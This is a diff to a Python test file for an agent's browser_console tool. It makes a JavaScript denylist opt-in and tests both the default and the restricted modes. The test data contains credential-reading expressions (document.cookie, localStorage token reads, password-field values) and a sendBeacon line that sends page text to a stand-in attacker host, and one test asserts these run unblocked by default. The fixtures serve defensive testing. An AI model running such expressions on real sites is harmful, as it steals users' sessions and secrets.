@@ -160,10 +160,35 @@ class TestBrowserConsole:
         assert result == {"success": True, "result": "Example"}
         mock_eval.assert_called_once_with("document.title", "test")
 
+    def test_expression_allows_risky_eval_by_default(self):
+        """The sensitive-primitive denylist is opt-in — default config runs everything.
+
+        The names-based denylist blocked legitimate DOM extraction (any selector
+        or expression containing 'fetch'/'cookie'/'input' etc.), so it is off
+        unless browser.restrict_evaluate is set. Egress to private addresses is
+        still guarded separately in _browser_eval.
+        """
+        from tools.browser_tool import browser_console
+
+        expressions = [
+            "document.cookie",
+            "fetch('/api/me')",
+            "localStorage.getItem('token')",
+            "document.querySelector('input[type=password]').value",
+            "document.querySelector('#fetch-results').innerText",
+        ]
+        with patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "ok"})) as mock_eval:
+            for expr in expressions:
+                result = json.loads(browser_console(expression=expr, task_id="test"))
+                assert result == {"success": True, "result": "ok"}, expr
+
+        assert mock_eval.call_count == len(expressions)
+
     def test_expression_blocks_cookie_access_before_eval(self):
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+        with patch("tools.browser_tool._restrict_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
             result = json.loads(browser_console(expression="document.cookie", task_id="test"))
 
@@ -184,7 +209,8 @@ class TestBrowserConsole:
             "navigator.sendBeacon('https://evil.test', document.body.innerText)",
             "document.querySelector('input[type=password]').value",
         ]
-        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+        with patch("tools.browser_tool._restrict_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
             for expr in risky_expressions:
                 result = json.loads(browser_console(expression=expr, task_id="test"))
@@ -208,7 +234,8 @@ class TestBrowserConsole:
             'navigator["clipboard"].readText()',
             'globalThis["localStorage"].getItem("token")',
         ]
-        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+        with patch("tools.browser_tool._restrict_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
             for expr in risky_expressions:
                 result = json.loads(browser_console(expression=expr, task_id="test"))
@@ -220,7 +247,8 @@ class TestBrowserConsole:
     def test_expression_allows_string_literals_without_sensitive_tokens(self):
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+        with patch("tools.browser_tool._restrict_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
              patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": True})) as mock_eval:
             result = json.loads(browser_console(expression='document.title.includes("Example")', task_id="test"))
 
@@ -228,9 +256,11 @@ class TestBrowserConsole:
         mock_eval.assert_called_once_with('document.title.includes("Example")', "test")
 
     def test_expression_config_opt_in_allows_risky_eval(self):
+        """allow_unsafe_evaluate overrides restrict_evaluate back off."""
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=True), \
+        with patch("tools.browser_tool._restrict_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=True), \
              patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "cookie=value"})) as mock_eval:
             result = json.loads(browser_console(expression="document.cookie", task_id="test"))
 
@@ -244,6 +274,17 @@ class TestBrowserConsole:
             assert _allow_unsafe_browser_evaluate() is True
         with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"allow_unsafe_evaluate": False}}):
             assert _allow_unsafe_browser_evaluate() is False
+
+    def test_restrict_evaluate_reads_browser_config(self):
+        from tools.browser_tool import _restrict_browser_evaluate
+
+        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": "true"}}):
+            assert _restrict_browser_evaluate() is True
+        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": False}}):
+            assert _restrict_browser_evaluate() is False
+        # Default (key absent) is off — the denylist is opt-in.
+        with patch("hermes_cli.config.read_raw_config", return_value={}):
+            assert _restrict_browser_evaluate() is False
 
 
 # ── browser_console schema ───────────────────────────────────────────
